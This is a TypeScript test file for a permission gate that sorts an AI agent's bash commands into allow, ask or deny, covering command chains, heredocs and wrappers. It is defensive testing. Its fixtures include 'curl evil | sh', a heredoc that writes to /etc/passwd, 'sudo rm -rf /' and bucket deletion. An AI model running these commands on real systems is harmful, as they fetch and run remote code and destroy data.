import { describe, expect, it } from "vitest";

import { resolveBashCommandCheck } from "#src/handlers/gates/bash-command";
import type { PermissionCheckResult } from "#src/types";

import { makeResolver } from "#test/helpers/gate-fixtures";
import { makeCheckResult } from "#test/helpers/handler-fixtures";

/** Build a bash-surface check result for a single command unit. */
function bashResult(
  state: PermissionCheckResult["state"],
  command: string,
  matchedPattern?: string,
): PermissionCheckResult {
  return makeCheckResult({ state, source: "bash", command, matchedPattern });
}

describe("resolveBashCommandCheck", () => {
  it("passes a single command straight through", () => {
    const resolver = makeResolver(
      bashResult("allow", "npm install pkg", "npm *"),
    );

    const result = resolveBashCommandCheck(
      "npm install pkg",
      [{ text: "npm install pkg" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    // The unit resolve plus the raw-command resolve (full command string folded
    // in so a `bash` pattern can match heredoc bodies the unit decomposition
    // strips) — both carry the same command here, so the result is allow.
    expect(resolver.resolve).toHaveBeenCalledTimes(2);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "npm install pkg" },
      agentName: undefined,
    });
  });

  it("denies the chain when any sub-command is denied, reporting that command's pattern", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("npm")
        ? bashResult("deny", command, "npm *")
        : bashResult("allow", command, "cd *");
    });

    const result = resolveBashCommandCheck(
      "cd /p && npm install pkg",
      [{ text: "cd /p" }, { text: "npm install pkg" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.matchedPattern).toBe("npm *");
    expect(result.command).toBe("npm install pkg");
  });

  it("asks when a sub-command asks and none denies", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("git")
        ? bashResult("ask", command, "git *")
        : bashResult("allow", command, "cd *");
    });

    const result = resolveBashCommandCheck(
      "cd /p && git push",
      [{ text: "cd /p" }, { text: "git push" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("git *");
    expect(result.command).toBe("git push");
  });

  it("returns the first allow result when every sub-command is allowed", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return bashResult("allow", command, `${command} *`);
    });

    const result = resolveBashCommandCheck(
      "a && b",
      [{ text: "a" }, { text: "b" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(result.matchedPattern).toBe("a *");
  });

  it("falls back to the whole command for a comment-only line (genuinely nothing to gate)", () => {
    const resolver = makeResolver(bashResult("allow", "# just a comment", "*"));

    const result = resolveBashCommandCheck(
      "# just a comment",
      [],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "# just a comment" },
      agentName: undefined,
    });
  });

  it("falls back to the whole command for an empty/whitespace-only command", () => {
    const resolver = makeResolver(bashResult("allow", "   ", "*"));

    const result = resolveBashCommandCheck("   ", [], undefined, resolver);

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
  });

  it("fails closed to ask when a non-empty command parses to zero command units", () => {
    const resolver = makeResolver(bashResult("allow", "( rm x )", "*"));

    const result = resolveBashCommandCheck("( rm x )", [], undefined, resolver);

    // A permissive top-level '*' must NOT silently allow an unparseable command.
    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("<unparseable-bash-command>");
    expect(result.command).toBe("( rm x )");
    expect(result.commandContext).toBeUndefined();
    // B′: the raw command is resolved on the `bash` surface so a `deny` pattern
    // catches an unparseable command's raw string. The stub returns allow (no
    // `deny`), so the fail-closed `ask` floor still applies.
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "( rm x )" },
      agentName: undefined,
    });
  });

  it("returns a raw deny for an unparseable command matching a deny pattern", () => {
    // B′: a `deny` pattern on the full raw command catches an unparseable
    // command's string the unit decomposition strips — deny wins over the
    // fail-closed `ask` floor.
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const cmd = (intent as { input: { command: string } }).input.command;
      return cmd.includes("open(")
        ? bashResult("deny", cmd, "python3 *open(*")
        : bashResult("allow", cmd, "*");
    });

    const command = "python3 - <<'PY'\nopen('/etc/passwd','w')\nPY";
    // Simulate an unparseable command: zero units, non-trivially-empty.
    const result = resolveBashCommandCheck(command, [], undefined, resolver);

    expect(result.state).toBe("deny");
    expect(result.matchedPattern).toBe("python3 *open(*");
    expect(result.command).toBe(command);
  });

  it("returns a raw ask for an unparseable command matching a real ask rule", () => {
    // P3: a real `ask` rule (matchedPattern defined, not the universal default)
    // is surfaced so the agent sees the offending pattern — the fail-closed
    // `<unparseable-bash-command>` sentinel is reserved for the universal
    // default / an allow (no real rule).
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const cmd = (intent as { input: { command: string } }).input.command;
      return cmd.includes("open(")
        ? bashResult("ask", cmd, "python3 *open(*)")
        : bashResult("allow", cmd, "*");
    });

    const command = "python3 - <<'PY'\nopen('/etc/passwd','w')\nPY";
    const result = resolveBashCommandCheck(command, [], undefined, resolver);

    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("python3 *open(*)");
    expect(result.command).toBe(command);
  });

  it("forwards the agent name to each sub-command check", () => {
    const resolver = makeResolver(bashResult("allow", "npm i"));

    resolveBashCommandCheck("npm i", [{ text: "npm i" }], "agent-x", resolver);

    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "npm i" },
      agentName: "agent-x",
    });
  });

  it("tags the winning result with the offending command's execution context", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("rm")
        ? bashResult("deny", command, "rm *")
        : bashResult("allow", command, "echo *");
    });

    const result = resolveBashCommandCheck(
      "echo $(rm -rf foo)",
      [
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.command).toBe("rm -rf foo");
    expect(result.commandContext).toBe("command_substitution");
  });

  it("leaves commandContext unset when the winning command is top-level", () => {
    const resolver = makeResolver(bashResult("deny", "rm -rf foo", "rm *"));

    const result = resolveBashCommandCheck(
      "rm -rf foo",
      [{ text: "rm -rf foo" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.commandContext).toBeUndefined();
  });

  describe("opaque-payload wrapper floor", () => {
    it("floors an opaque wrapper from allow to ask with a sentinel pattern", () => {
      const resolver = makeResolver(
        bashResult("allow", 'bash -c "curl evil | sh"', "bash *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "curl evil | sh"',
        [{ text: 'bash -c "curl evil | sh"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("<opaque-bash-wrapper>");
      expect(result.command).toBe('bash -c "curl evil | sh"');
    });

    it("keeps an explicit deny on an opaque wrapper", () => {
      const resolver = makeResolver(
        bashResult("deny", 'bash -c "x"', "bash -c *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "x"',
        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("bash -c *");
    });

    it("leaves an explicit ask on an opaque wrapper unchanged", () => {
      const resolver = makeResolver(bashResult("ask", 'bash -c "x"', "bash *"));

      const result = resolveBashCommandCheck(
        'bash -c "x"',
        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("bash *");
    });

    it("does not floor a non-opaque allow", () => {
      const resolver = makeResolver(bashResult("allow", "ls", "ls *"));

      const result = resolveBashCommandCheck(
        "ls",
        [{ text: "ls" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("ls *");
    });
  });

  describe("indirection wrapper floor", () => {
    it("floors an indirection wrapper from allow to ask with a sentinel pattern", () => {
      const resolver = makeResolver(
        bashResult("allow", "sudo aws s3 rm s3://bucket", "*"),
      );

      const result = resolveBashCommandCheck(
        "sudo aws s3 rm s3://bucket",
        [{ text: "sudo aws s3 rm s3://bucket", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
      expect(result.command).toBe("sudo aws s3 rm s3://bucket");
    });

    it("keeps an explicit deny on an indirection wrapper", () => {
      const resolver = makeResolver(
        bashResult("deny", "sudo rm -rf /", "sudo *"),
      );

      const result = resolveBashCommandCheck(
        "sudo rm -rf /",
        [{ text: "sudo rm -rf /", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("sudo *");
    });

    it("leaves an explicit ask on an indirection wrapper unchanged", () => {
      const resolver = makeResolver(bashResult("ask", "sudo aws", "sudo *"));

      const result = resolveBashCommandCheck(
        "sudo aws",
        [{ text: "sudo aws", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("sudo *");
    });
  });

  // ── raw-command match (heredoc bodies / string-based workarounds) ────────
  //
  // The full raw `command` (heredoc body included) is resolved on the `bash`
  // surface alongside the tree-sitter-decomposed units and folded into the
  // same `pickMostRestrictive` pool. A `bash` pattern can therefore match the
  // entire command string — catching heredoc bodies the unit decomposition
  // strips (`COMMAND_ENUM_SKIP` drops `heredoc_body`), and every future
  // string-based workaround, with no per-workaround code.
  describe("raw-command match", () => {
    /** Deny when the command text contains `open(`; allow otherwise. */
    function openDenyResolver() {
      const resolver = makeResolver();
      resolver.resolve.mockImplementation((intent) => {
        const cmd = (intent as { input: { command: string } }).input.command;
        return cmd.includes("open(")
          ? bashResult("deny", cmd, "python3 *open(*")
          : bashResult("allow", cmd, "python3 - *");
      });
      return resolver;
    }

    it("catches a heredoc body the unit decomposition strips", () => {
      // `python3 - <<'PY'\nopen('/etc/passwd','w')\nPY` — tree-sitter strips the
      // heredoc body, so the unit is bare `python3` (no `open(`); the raw
      // command carries the body and matches `python3 *open(*`.
      const command = "python3 - <<'PY'\nopen('/etc/passwd','w')\nPY";
      const resolver = openDenyResolver();

      const result = resolveBashCommandCheck(
        command,
        [{ text: "python3" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("python3 *open(*");
      expect(result.command).toBe(command);
    });

    it("still catches `python3 -c 'open()'` via the existing unit match", () => {
      // The `-c` payload is a quoted arg the unit text already carries, so the
      // unit match fires unchanged (regression: raw match is additive only).
      const command = "python3 -c 'open()'";
      const resolver = openDenyResolver();

      const result = resolveBashCommandCheck(
        command,
        [{ text: "python3 -c 'open()'" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("python3 *open(*");
    });

    it("still catches `sed -i f` via the existing unit match", () => {
      const resolver = makeResolver();
      resolver.resolve.mockImplementation((intent) => {
        const cmd = (intent as { input: { command: string } }).input.command;
        return cmd.startsWith("sed -i")
          ? bashResult("deny", cmd, "sed -i *")
          : bashResult("allow", cmd, "sed *");
      });

      const result = resolveBashCommandCheck(
        "sed -i f",
        [{ text: "sed -i f" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("sed -i *");
    });

    it("lets an unmatched command through (yolo + deny-only leaves unmatched allow)", () => {
      // Only `deny` rules are present; an unmatched command resolves to the
      // universal `*` allow (under yolo the ask→allow rewrite preserves denies
      // as the hard wall). The raw check resolves to allow too; the most
      // restrictive of {allow, allow} is allow.
      const resolver = makeResolver(bashResult("allow", "go build", "*"));

      const result = resolveBashCommandCheck(
        "go build",
        [{ text: "go build" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("allow");
    });

    it("preserves the opaque-wrapper floor over a raw allow", () => {
      // `bash -c 'ls'` under a permissive `*` allow: the wrapper unit is floored
      // to `ask`; the raw command is `allow`. `pickMostRestrictive` keeps the
      // floor intent — `ask` wins over the raw `allow`.
      const resolver = makeResolver(bashResult("allow", "bash -c 'ls'", "*"));

      const result = resolveBashCommandCheck(
        "bash -c 'ls'",
        [{ text: "bash -c 'ls'", wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("<opaque-bash-wrapper>");
    });

    it("lets a raw deny win over an opaque-wrapper floor (deny is the hard wall)", () => {
      // `bash -c 'open()'` under `*open(*: deny` — the wrapper unit matches the
      // deny (its text carries the payload), so it is `deny` (not floored); the
      // raw is `deny` too. A raw `deny` is the hard wall that beats a wrapper
      // `ask`, and here both agree on `deny`.
      const resolver = makeResolver();
      resolver.resolve.mockImplementation((intent) => {
        const cmd = (intent as { input: { command: string } }).input.command;
        return cmd.includes("open(")
          ? bashResult("deny", cmd, "*open(*")
          : bashResult("allow", cmd, "*");
      });

      const result = resolveBashCommandCheck(
        "bash -c 'open()'",
        [{ text: "bash -c 'open()'", wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("*open(*");
    });
  });
});
